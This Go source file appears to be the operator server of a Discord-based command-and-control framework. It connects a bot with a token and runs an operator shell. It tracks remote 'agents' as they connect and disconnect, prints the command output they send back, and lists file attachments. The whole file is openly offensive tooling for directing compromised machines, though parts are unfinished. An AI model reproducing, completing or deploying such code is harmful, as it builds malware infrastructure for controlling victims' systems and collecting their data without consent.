package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"DiscordGo/pkg/agents"
	"DiscordGo/pkg/cli"
	"DiscordGo/pkg/message"
	"DiscordGo/pkg/util/constants"

	"github.com/bwmarrin/discordgo"
	"github.com/fatih/color"
)


func init(){
	// Create Database 
	// COnnect to db
}

func main(){
	dg, err := discordgo.New("Bot " + constants.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	dg.AddHandler(messageCreateor)

	color.Red(cli.ASCIIArt)
	go cli.Shell(dg)

	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	// fmt.Println("Server is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	fmt.Println("Exiting server. \n All agent will be deleted unless they reconnect")
	// Cleanly close down the Discord session.
	dg.Close()
}

func messageCreateor(s *discordgo.Session, m *discordgo.MessageCreate){
	var messageJSON message.Message
	json.Unmarshal([]byte(m.Content), &messageJSON)

	// TODO : Fix the ping pong feature
	if messageJSON.MessageType == message.MESSAGE_NEW {
		color.Green("\n[+] New agent connected: " + messageJSON.AgentID + "\n")
		messageSplit := strings.Split(messageJSON.Message, ":")

		// Add to the agents list
		agents.AddNewAgent(messageJSON.AgentID, messageSplit[0], messageSplit[1], messageSplit[2])
		cli.MainCompleter()
	} else if messageJSON.MessageType == message.MESSAGE_DISCONNECT {
		color.Red("\n[-] Agent " + messageJSON.AgentID + " disconnected\n")
		agents.RemoveAgent(messageJSON.AgentID)		
		cli.MainCompleter()

	} else if messageJSON.MessageType == message.MESSAGE_OUTPUT {
		color.Blue("\n[!] Result from " + messageJSON.AgentID) // Change to IP
		color.Blue(messageJSON.Message)

		// fmt.Println("\nNumber of attachments")
		// fmt.Println(len(m.Attachments))

		// TODO: This doesn't work :(
		if messageJSON.HasAttachment {
			for _, file := range m.Attachments {
				fmt.Println(file.Filename)
			}
		}
	} else if messageJSON.MessageType == message.MESSAGE_PONG {
		color.Green("\n[!] Agent " + messageJSON.AgentID + " is still up\n")
	}
}